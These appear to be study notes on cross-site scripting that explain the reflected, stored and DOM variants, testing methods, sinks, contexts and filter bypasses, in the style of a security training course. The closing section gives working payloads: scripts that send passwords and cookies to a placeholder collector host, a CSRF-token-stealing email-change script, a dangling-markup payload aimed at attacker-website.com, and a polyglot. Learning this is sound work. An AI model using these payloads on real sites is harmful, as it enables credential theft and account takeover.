- **Reflected XSS** - malicious script comes from the current HTTP request
- **Stored XSS** - malicious script comes from the website's database
- **DOM-based XSS** - vulnerability exists in client-side code rather than server-side code

## Reflected XSS

- arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way

- eg - a website has a search function which receives the search term in the URL parameter
  `https://insecure-website.com/search?term=gift`

  - The application echoes the supplied search term in the response to this URL: `<p>You searched for: gift</p>`

  - can construct XSS by
    `https://insecure-website.com/search?term=<script>/*+something+bad+stuff</script>`

### Impacts

- perform any action within the application that the user can perform
- view any information that the user is able to view
- modify any information that the user is able to modify
- initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user

### How to find and test for reflected XSS

- **test every entry point** - parameters or other data within the URL query string or message body and URL file path, HTTP headers
- **submit random alphanumeric values** - submit a unique random value and determine whether the value is reflected in the response.
- **determine the reflection context** - for each location within the response where the random value is reflected, determine its context; text between HTML tags, within a tag attribute which might be quoted, etc
- **test a candidate payload** - based on context of the reflection, test an initial candidate XSS payload that will trigger JS execution
- **Test alternative payloads**
- **Test the attack in a browser** - (alert(document.domain))

---

## Stored XSS (Second-order/Persistent XSS)

- arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way
- eg - comments on a blog post, username in chat room or contact details on a customer order, or data arrived from other untrusted sources; such as webmail application, marketing application, network monitoring application

### Impacts

- any actions that are applicable to the impact of reflected XSS
- self-contained within the application itself
- attacker does not need to find an external way of inducing other users to make a particular request containing their exploit

### How to find and test

- **test all entry points** such as

  - parameters or other data within the URL query string and message body
  - URL file path
  - HTTP request headers that might not be exploitbale in relation to reflected XSS
  - any out-of-band routes via which an attacker can deliver data into the application
  - the end points for stored XSS attacks are all possible HTTP responses that are returned to any kind of application user in any situation

- first step in testing is to locate the links between entry and exit points, whereby data submitted to an entry point is emitted from an exit point.
- the following are same as reflected XSS

---

## DOM-based XSS

- arises when an application contains some client-side JS that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM

eg -

```js
var search = document.getElementById("search").value;
var results = document.getElementById("results");
results.innerHTML = "You searched for: " + search;
```

- XSS can be exploited by
  `You searched for: <img src=1 onerror='something+bad+script'>`

- In typical case, the input field would be populated from part of the HTTP request, such as URL query string parameter, allowing the attaker to deliver an attack using a malicious URL, in the same manner as reflected XSS

- most common source for DOM XSS is the URL, which typically accessed with the `window.location` object.

### How to test for DOM-based XSS

- use a browser with developer tools
- **Testing HTML sinks** - to test for DOM XSS in an HTML sink,

  - place a random alphanumeric string into the source (such as `location.search`)
  - use developer tools to inspect the HTML and find where your string appears by using `Ctrl + F` ('View source' option won't work for DOM XSS testing)
  - For each location where your string appears within the DOM, you need to identify the context
  - based on that context, you need to refine your input to see how it is processed
  - if data gets URL-encoded before being processed, then an XSS attack is unlikely to work

- **Testing JS execution sinks**
  - your input doesn't necessarily appear anywhere within the DOM and can't search for it
  - need to use the JS debugger to determine whether and how the input is sent to a sink
  - use the JS debugger to add a break point and follow how the source's value is used

### Exploiting DOM XSS with different sources and sinks

- A website is vulnerable to DOM-based XSS if there is an executable path via which data can propagate from source to sink

#### Sinks that leads to DOM-XSS vulns

```js
document.write();
document.writeln();
document.domain;
element.innerHTML;
element.outerHTML;
element.insertAdjacentHTML;
element.onevent;
```

jQuery functions

```js
add();
after();
append();
animate();
insertAfter();
insertBefore();
before();
html();
prepend();
replaceAll();
replaceWith();
wrap();
wrapInner();
wrapAll();
has();
constructor();
init();
index();
jQuery.parseHTML();
$.parseHTML();
```

### DOM XSS in jQuery

1. attr function with location.search

```js
$(function () {
  $("#backLink").attr(
    "href",
    new URLSearchParams(window.location.search).get("returnUrl")
  );
});
```

- can exploit this by modifying the URL by

```
?returnUrl=javascript:alert(document.domain)
```

2. $() selector function with location.hash

- used for animations or auto-scrolling to a particular element on the page

```js
$(window).on("hashchange", function () {
  var element = $(location.hash);
  element[0].scrollIntoView();
});
```

- to exploit, one of the simplest ways of doing this is to deliver the exploit via an iframe

```html
<iframe
  src="https://vulnerable-website.com#"
  onload="this.src+='<img src=1 onerror=alert(1)>'"
/>
```

### DOM XSS in AngularJS

- when a site uses the `ng-app` attribute on a HTML element, it will be processed by Angular JS.
- AngularJS will execute JS inside double curly braces that can occur directly in HTML or inside attributes

---

## What can XSS be used for?

- Impersonate or masquerade as the victim user
- Carry out any action that the user is able to perform
- Read any data that the user is able to perform
- Capture the user's login credentials
- Perform virtual defacement fo the website
- Inject trojan funcationality into the website

---

## XSS Contexts

- Key task is to identify the XSS context:
  - location within the response where attacker-controllable data appears
  - any input validation or other processing that is being performed on that data by the application

### XSS between HTML tags

- Some useful ways of executing JS are:

```html
<script>
  alert(document.domain);
</script>
<img src="1" onerror="alert(1)" />
```

- see the labs from 11 - 14

### XSS in HTML tag attributes

- `" autofocus onfocus=alert(1) x="`
- `<a href="javascript:alert(1)">`

### XSS in JS bypass

- `';alert(1)//` - to break out of JS string
- `</script><script>alert(1)</script>` - if `'\` are filtered
- `\';alert(1)//` - if `'` is filtered
- `<script>onerror=alert;throw 1</script>` - execute without parentheses
- `<script>{onerror=alert}throw 1</script>` - without semicolon
- `<script>throw onerror=alert,'some string',123,'haha'</script>`
  - throw - create JS exception and accepts JS expression
  - onerror - allows to assign a function to JS error handler
  - alert - will be called when any new exeption is thrown
  - 'haha' - throw accepts an expression, the assignment to onerror happens before alert is called and the last part of the expression is sent to the exception handler
- `<script>{onerror=eval}throw'=alert\x281337\x29'</script>`
- `<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>`
- `<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>`
- `&apos;-alert(document.domain)-&apos;`

---

## Dangling markup injection

- technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible
- suppose an application embeds attacker-controllable data into its responses in an unsafe way

```
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

- suppose it does not filter or escape the `>,"` characters
- attacker can use `">` to break out of the quoted attribute value and the enclosing tag and return to an HTML context
- suppose attacker can't perform regular XSS attack due to input filters, content security policy or other obstacles
- it is still be possible to deliver a dangling markup injection attack using payload like

```
"><img src='//attacker-website.com?
```

- note `src` attributes in the payload **doesn't close which is left "dangling"**
- when a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute
- everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string which can contain sensitive data such as CSRF tokens, email messages, financial data
-

---

## Payloads Examples

- To capture passwords

```html
<input name="username" id="username" />
<input
  type="password"
  name="password"
  onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"
/>
```

- To steal cookies

```html
<script>
  fetch("https://BURP-COLLABORATOR-SUBDOMAIN", {
    method: "POST",
    mode: "no-cors",
    body: document.cookie,
  });
</script>
```

- XSS with CSRF (change email example)

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open("get", "/my-account", true);
  req.send();
  function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open("post", "/my-account/change-email", true);
    changeReq.send("csrf=" + token + "&email=test@test.com");
  }
</script>
```

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
